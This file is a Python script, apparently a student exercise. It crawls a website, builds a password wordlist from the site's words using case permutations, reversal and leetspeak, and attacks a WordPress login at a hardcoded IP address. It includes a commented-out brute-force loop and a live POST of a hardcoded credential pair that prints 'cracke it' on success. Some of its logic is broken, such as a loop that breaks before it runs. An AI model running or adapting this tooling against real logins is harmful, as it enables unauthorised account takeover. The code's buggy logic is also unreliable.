import socket
import sys
import argparse
from urllib.parse import urlparse, urljoin, urlsplit
from bs4 import BeautifulSoup
from bs4.element import Comment
from urllib.parse import urljoin
import base64
import re
import os

### Common Error Codes
error_codes={'400':'BAD REQUEST', '401': 'UNAUTHORIZED', '403': 'FORBIDDEN','404': 'NOT FOUND','410':' GONE',
	'500': 'INTERNAL SERVER ERROR','501': 'NOT IMPLEMENTED','503':'SERVICE UNAVAILABLE','550':'PERMISSION DENIED'}

### Main Website ###
website = None
user_agent = "Googlebot/2.1 (+http://www.google.com/bot.html)"
count_page = 0
count_depth = 0
# user_agent =None
login_url=[]

##############################################################
#                Create 'wordsList'
###############################################################
def capitalization_permutations(s):
    # >>> list(capitalization_permutations('abc'))
    # ['ABC', 'aBC', 'AbC', 'abC', 'ABc', 'aBc', 'Abc', 'abc']
    # >>> list(capitalization_permutations(''))
    # ['']
    # >>> list(capitalization_permutations('X*Y'))
    # ['X*Y', 'x*Y', 'X*y', 'x*y']
    if s == '':
        yield ''
        return
    for rest in capitalization_permutations(s[1:]):
        yield s[0].upper() + rest
        if s[0].upper() != s[0].lower():
            yield s[0].lower() + rest

def lower_upper_permutation(words_list):
	final_words = open("words_list.txt", "w+")
	new_list =[]
	for line in words_list:
		temp = list(capitalization_permutations(line))
		for item in temp:
			final_words.write("%s\n" % item)
			new_list.append(item)
	final_words.close()
	return new_list

# Function to reverse a string
def reverse(string):
    string = string[::-1]
    return string

# reverse
def reverse_chars(words_list):
	final_words = open("words_list.txt", "w+")
	temp_list = words_list
	for line in words_list:
		temp = reverse(line)
		if temp not in temp_list:
			temp_list.append(temp)
			final_words.write("%s\n" %temp)
	final_words.close()
	return temp_list

# leet-speak with the following case-insensitive conversions
def leet_speak(words_list):
	final_words = open("words_list.txt", "w+")
	temp_list = words_list
	for line in words_list:
		line = line.replace('a', '4').replace('A', '4')
		line = line.replace('e', '3').replace('E', '3')
		line = line.replace('l', '1').replace('L', '1')
		line = line.replace('t', '7').replace('T', '7')
		line = line.replace('o', '0').replace('O', '0')
		if line not in temp_list:
			final_words.write("%s\n" %line)
			temp_list.append(line)
	final_words.close()


def create_dict(words_file):  ## words_file = words.txt
	words_list =[]
	with open(words_file, 'r', encoding="utf-8") as f:
		for line in f:
			temp = line.lower()
			temp= re.sub(r'\W+', '', temp)
			if temp not in words_list:
				words_list.append(temp)
		f.close()
	if words_list != []:
		words_list = lower_upper_permutation(words_list)
		words_list = reverse_chars(words_list)
		leet_speak(words_list)
	else:
		print("No words")

############################# Some functions ##################
def find_words(soup,words):
    texts = soup.find_all(text=True)
    visible_texts = list(filter(tag_visible, texts)) 
    for n in range(len(visible_texts)):
    	tmp=visible_texts[n].split()
    	for i in range(len(tmp)):
    		if tmp[i] not in words:
    			words.append(tmp[i])
    return words

def tag_visible(element):
	if element.parent.name in ['style','script', 'head', 'title', 'meta', '[document]']:
		return False
	if isinstance(element, Comment):
		return False
	return True

def find_links(soup):
	global website
	allLinks = soup.findAll('a', href = True)
	temp_list = []
	domain = urlsplit(website)[1].split(':')[0]
	for ele in allLinks:
		thehttp=urlparse(ele['href'])
		if(thehttp.netloc == ''):
			thehttp = urljoin(website, ele['href'])
		elif thehttp.netloc != domain:
			continue
		if thehttp not in temp_list:
			temp_list.append(thehttp)
	return temp_list

###################### Personal Socket ###################
class MySocket:
    global user_agent
    def __init__(self):
    	''' Crete one socket instance
    	#### AF_INET refers to the address family ipv4
    	#### the SOCK_STREAM means connection oriented TCP protocol--> which is used to connect to a server
    	'''
    	self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self, url):
        url = urlparse(url)
        host = url.hostname
        path = url.path
        addr = socket.getaddrinfo(host, 80)[0][-1]
        self.sock.connect(addr)
        return (host, path)


    def split_response(self, response, filename):
    	if len(response) > 0:
    		response= b''.join(response)
    		response = response.decode("utf8", "ignore")
    		response = response.split('\r\n\r\n')
    		header = response[0]
    		with open('header.txt', 'w') as f:
    			f.write(header)
    			f.close()
    		content = (response[1]).encode("utf-8")
    		with open(filename, "wb") as f:
    			f.write(content)
    			f.close()
    	else:
    		print("No available response")


    ## 'Get' request && its reposne
    def get_response(self, url, filename):  ## Send 'Get' Request
    	tmp = self.connect(url)
    	request = ('GET /%s HTTP/1.0\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n' % (tmp[1], tmp[0], user_agent))
    	sent = self.sock.sendall(bytes(request, "utf-8"))
    	if sent == 0:
    		print("socket connection broken\n")
    	else:
    		response = []
    		while(1):
    			data = self.sock.recv(4096)
    			if data:
    				response.append(data)
    			else:
    				self.sock.close()
    				break
    	self.split_response(response,filename)

    def post_response():
    	print("post")



############################## Crawler####################################
class Crawler:
	def __init__(self):
		self.choice = 'breadth'
		self.depth = 0
		self.page = 0

		parser = argparse.ArgumentParser()
		parser.add_argument('-u', '--user', nargs='?', type=str, metavar='user_agent', help='must be provide a custom user-agent for use', required=True)
		parser.add_argument('url', type=str, help="please enter website's url")
		parser.add_argument('-c', '--choice', nargs='?', type=str, choices=['depth','breadth'], default='breadth', help="Depth-first/Breadth-first choice of crawling", required=False)
		parser.add_argument('-d', '--depth', nargs='?', type=int, metavar='num', default=0, help="Maximum depth of pages to crawl", required=False)
		parser.add_argument('-p','--page', nargs='?', type=int, metavar='num', default=0, help='Maximum total number of crawled pages', required= False)
		sys.args = parser.parse_args()

####################  Get Request ############################
	def http_get(self, url, filename):
		sock = MySocket()
		sock.get_response(url,filename)

################### Post Request ##################################
	def http_post(self, url, data):
		sock = MySocket()
		sock.post_response()

	def isDead(self):
		with open("header.txt", encoding='utf-8') as f:
			firstline = f.readline().rstrip()
			code = firstline.split(' ')[1]
			if code in error_codes:
				return True
			else:
				return False
		return False

	def check_login(self,url):
		global login_url
		if "login" in url:
			if url not in login_url:
				login_url.append(url)


####################### DFS ##############################
def do_dfs(crawler, words, links, crawled_links, page, depth):
	if crawler.page == 0:
		page = 0
	else:
		if page >= crawler.page:
			return "finish page"
	if crawler.depth == 0:
		depth = 0
	else:
		if depth > crawler.depth:
			return 'finish depth'
	global login_url
	while(links):
		temp = links.pop(0)
		if temp not in crawled_links:
			crawler.http_get(temp, "content.html")
			if crawler.isDead():
				continue
			crawler.check_login(temp)

			web = open("content.html", encoding ='utf-8')
			soup = BeautifulSoup(web, "html.parser")
			words = find_words(soup, words)
			links = find_links(soup)
			crawled_links.append(temp)
			page += 1
			depth += 1
			if len(links) > 0:
				do_dfs(crawler, words, links, crawled_links, page,depth)
			else:
				depth -= 1
	return (words)



#finding and putting all the links found on the website into the list links_depth[] at a specific level
def find_links_bfs(soup,links_depth,depth,logins,crawler):
	allLinks = find_links(soup)
	temp_list=[]
	for ele in allLinks:
		found = 0
		for n in range(len(links_depth)):
			if ele in links_depth[n]:
				found = 1
				break
		if ele in temp_list:
			found = 1
		if found == 0:
			crawler.check_login(ele)
			temp_list.append(ele)

	if depth in links_depth:
		links_depth[depth].extend(temp_list)
	else:
		links_depth[depth]=temp_list


################ BFS ####################
def do_bfs(crawler, words, links_depth):
	current_depth = 1
	page_opened = 1
	while(1):
		if (crawler.depth != 0) and (current_depth == crawler.depth):
			break
			print("fdsf")
			for each_link in links_depth[current_depth]:
				print("here")
				crawler.http_get(each_link, "content.html")
				if crawler.isDead():
					continue
				page_opened += 1
				web = open("content.html", encoding ='utf8')
				soup = BeautifulSoup(web, 'html.parser')
				words = find_words(soup, words)
				find_links_bfs(soup, links_depth, current_depth+1, login_url, crawler)

				if page_opened == crawler.page:
					break
			if page_opened == crawler.page:
				break
			current_depth += 1
		else:
			break
	return words


def create_result():
	combine_file = open("results.txt", 'w', encoding="utf-8")
	combined_list = []

	with open("words.txt", mode="r", encoding="utf-8") as f:
	    for line in f:
	    	combined_list.append(line.strip())
	    f.close()
	    for i in range(0, len(combined_list)):
	    	for j in range(0, len(combined_list)):
	    		log = combined_list[i]
	    		pwd = combined_list[j]
	    		obj = log + "," +pwd
	    		combine_file.write(obj)
	    		combine_file.write('\n')
	combine_file.close()


def cracker(words):
	global login_url
	with open("words.txt", "w+", encoding="utf-8") as f:
		words = "\n".join(words)
		f.write(words)
		f.close()
	create_dict("words.txt")


###################### BFS ###############################
def main():
	global user_agent
	global website

	words = []
	links = []

	crawler = Crawler()
	user_agent = sys.args.user
	website = sys.args.url
	crawler.choice = sys.args.choice
	crawler.depth = sys.args.depth
	crawler.page = sys.args.page

	crawler.http_get(website, "content.html")
	if crawler.isDead():
		print("This website is dead-end page!!")
		exit(0)
	crawler.check_login(website)

	web = open("content.html", encoding = "utf-8")
	soup = BeautifulSoup(web, "html.parser")
	words = find_words(soup, words)
	links = find_links(soup)

	if crawler.page == 1 or crawler.depth == 1:
		cracker(words)
		return "finish"
	else:
		if crawler.choice == 'depth':
			do_dfs(crawler, words, links, [],1,1)
		else:
			links_depth={}
			links_depth[0] = [website]
			find_links_bfs(soup,links_depth,1,login_url,crawler) 
			do_bfs(crawler, words, links_depth)
		#cracker(words)
	crawler.http_get("http://3.16.240.57/wp-login.php", 'login.html')
	with open("login.html", encoding= 'utf8') as f:
		soup2 = BeautifulSoup(f,"html.parser")
		allForm = soup2.findAll('form')
		user= None
		pwd = None
		for ele in allForm:
			t = ele.find('input').get('id')
			pwd = ele.find('input', type="password").get('name')
			if "log" in t:
				user = ele.find('input').get('name')
		print(user, pwd)
	return (user, pwd)


import requests
import webbrowser

(user_1,pwd_1) =  main()


# combine_file = open("tmp_result.txt", 'r', encoding="utf-8")
# l = []
# with open("tmp_result.txt", mode="r", encoding='utf-8') as file_1:
#     for line in file_1:
#         log, pwd = line.split(',')
#         login_data = dict()
#         print(log.encode('utf-8').decode('utf-8'))
#         login_data = {
#             user_1:log,
#             pwd_1 :pwd.strip(),
#         }
#         l.append(login_data)
#     file_1.close()
# for login_data in l:
#     with requests.Session() as s:
#         user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"
#         headers = {
#             'Userr_Agent': user_agent
#         }
#         # url = "https://3.16.240.57/wp-login.php"
#         url="http://3.16.240.57/wp-login.php"
#         r = s.post(url, data = login_data, headers=headers, verify=False)
#         with(open('f1.html', "wb+")) as f:
#             if r.url != url:
#                 break
#             print(r.status_code)
#             print("\nNew URL", r.url)
#             print("\nRedirection:")
#             for i in r.history:
#                 print(i.status_code, i.url)
#                 new = 2  # open in a new tab, if possible
#             f.write(r.content)

user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"
headers ={
	'Userr_Agent': user_agent
}
login_data ={
	user_1:'user',
	pwd_1:"EN9fQcC3jnsS",
	#'csrf_token':"IjViNDI2MDhjMGM3Y2IwYmRkNTFmNTQ2MjliZDI3NzBjNzkzOGY3NDQi.XARP5Q.Hh7Hs1fCKFLRobNpnAWMVgv77oA"
	# 'wp-submit': 'Log In'
}

with requests.Session() as s:
	# url = "https://3.16.240.57/wp-login.php"
	url="http://3.16.240.57/wp-login.php"
	r = s.post(url, data = login_data, headers=headers, verify=False)
	with(open('final.html', "wb+")) as f:
		if r.url != url:
			print("cracke it !!!!")
		else:
			print('faile')
		print(r.status_code)
		f.write(r.content)




